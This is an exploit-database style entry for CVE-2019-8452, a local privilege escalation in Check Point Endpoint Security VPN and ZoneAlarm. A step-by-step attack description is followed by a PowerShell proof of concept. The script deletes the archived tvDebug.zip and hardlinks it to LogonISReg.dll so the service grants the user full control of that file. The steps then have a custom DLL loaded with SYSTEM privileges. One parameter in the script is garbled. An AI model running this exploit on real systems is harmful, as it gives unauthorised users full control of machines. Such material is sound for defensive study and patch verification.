@@ -1,0 +1,71 @@
+# Exploit Title: CheckPoint Endpoint Security Client/ZoneAlarm 15.4.062.17802 - Privilege Escalation
+# Date: 2019-01-30
+# Exploit Author: Jakub Palaczynski
+# Vendor Homepage: https://www.checkpoint.com/
+# Version: Check Point Endpoint Security VPN <= E80.87 Build 986009514
+# Version: Check Point ZoneAlarm <= 15.4.062.17802
+# CVE: CVE-2019-8452
+
+
+Description:
+============
+
+It is possible to change permissions of arbitrary file so that user have full control over it after exploitation which results in Local Privilege Escalation.
+
+It was found that Check Point software (Endpoint Security Client and ZoneAlarm) uses tvDebug.log file stored in "C:\Windows\Internet Logs\tvDebug.log" or in ProgramData, for example "C:\ProgramData\CheckPoint\ZoneAlarm\Logs\tvDebug.log".
+Over this log file all authenticated users have full control and it was found that Check Point service writes to it with SYSTEM privileges.
+However this file could not be used for exploitaion as it is always used/taken by Check Point service so for example this is why users cannot delete it in normal conditions (unless service crashes and/or is restarted).
+However it was noticed that when this log file reaches some limit (depending on software) then it is archived to the same location and name but with ZIP extension. The same permissions are set for this archive file so all authenticated users can access it.
+
+Taking all of this into account we can create an attack scenario:
+1. If tvDebug.zip file exists then delete it
+2. Create hardlink (using CreateHardlink.exe) named tvDebug.zip which points to other file that we would like to have permissions to (this file must not be taken by other process when Check Point service tries to use it)
+3. Fill tvDebug.log log file above the limit. For ZoneAlarm it is 50Mb, for VPN it is 20Mb. It can be done by using software as normal user.
+4. Restart system as service needs to be restarted to make an archive.
+5. Now your file has permissions changed and you have all access to it.
+6. If we pointed to "C:\Program Files (x86)\CheckPoint\Endpoint Connect\LogonISReg.dll" in step 2 then we can replace this DLL with custom one.
+7. Click "VPN Options" in Client GUI and then close this windows. Closing "VPN Options" window forces LogonISReg.dll to be loaded with SYSTEM privileges.
+
+
+Proof of Concept:
+=================
+
+# PoC written in PowerShell to fully exploit Check Point Endpoint Client. It can be used also to exploit ZoneAlarm.
+
+# file that we want to have permissions to
+# LogonISReg.dll is not used on startup and we can force to load it with SYSTEM privileges after exploitation
+$file = "C:\Program Files (x86)\CheckPoint\Endpoint Connect\LogonISReg.dll"
+
+# path to symboliclink testing tools CreateHardlink.exe
+# CreateHardlink.exe is a tool created by James Forshaw - https://github.com/googleprojectzero/symboliclink-testing-tools
+$hardlink = "C:\Temp\CreateHardlink.exe"
+
+Write-Host "[!] Detecting Check Point software."
+if ([System.IO.File]::Exists("$env:windir\Internet Logs\tvDebug.log")) {
+	$logfile = "$env:windir\Internet Logs\tvDebug.zip"
+	Write-Host "[+] Check Point Endpoint Security found."
+}
+elseif ([System.IO.File]::Exists("$env:programdata\CheckPoint\ZoneAlarm\Logs\tvDebug.log")) {
+	$logfile = "$env:programdata\CheckPoint\ZoneAlarm\Logs\tvDebug.zip"
+	Write-Host "[+] Check Point ZoneAlarm found."
+}
+else {
+	Write-Host "[-] Check Point software was not found."
+}
+
+Write-Host "[!] Trying to delete tvDebug.zip file."
+if ([System.IO.File]::Exists($logfile)) {
+    while ([System.IO.File]::Exists($logfile)) { Remove-Item -Force 朴ath $logfile -ErrorAction SilentlyContinue }
+    Write-Host "[+] Successfully deleted tvDebug.zip archive file."
+}
+else {
+    Write-Host "[+] tvDebug.zip archive file was not found."
+}
+
+Write-Host "[!] Creating hardlink to a file that we would like to change permissions."
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c $hardlink `"$logfile`" `"$file`""
+while (!([System.IO.File]::Exists($logfile))) { Sleep 1 }
+Write-Host "[+] Hardlink successfully created."
+Write-Host "[!] 1. Fill log file up to the limit and restart computer."
+Write-Host "[!] 2. Now when permissions are changed replace LogonISReg.dll with your custom DLL."
+Write-Host "[!] 3. Click VPN Options in Client GUI and close this window to force DLL load."
